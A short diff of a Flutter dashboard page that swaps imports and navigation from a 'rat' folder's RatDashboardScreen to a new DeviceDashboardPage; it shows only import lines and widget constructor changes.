@@ -39,9 +39,7 @@ import 'tools_page.dart';
 import 'X.dart';
 import 'global_chat_page.dart';
 import 'constants.dart';
-import 'rat/device_control_screen.dart';
-import 'rat/dashboard_screen.dart';
-import 'rat/api_service.dart';
+import 'device_dashboard.dart';
 
 class DashboardPage extends StatefulWidget {
   final String username;
@@ -485,9 +483,8 @@ class _DashboardPageState extends State<DashboardPage>
     Navigator.push(
       context,
       MaterialPageRoute(
-        builder: (_) => RatDashboardScreen(
-          sessionKey: sessionKey,
-          uId: role,
+        builder: (_) => DeviceDashboardPage(
+        username: username, 
         ),
       ),
     );
@@ -514,10 +511,7 @@ class _DashboardPageState extends State<DashboardPage>
         );
         break;
       case 2:
-        newPage = RatDashboardScreen(
-          sessionKey: sessionKey,
-          uId: role,
-        );
+        newPage = DeviceDashboardPage(username: username);
         break;
       case 3:
         newPage = InfoPage(sessionKey: sessionKey);
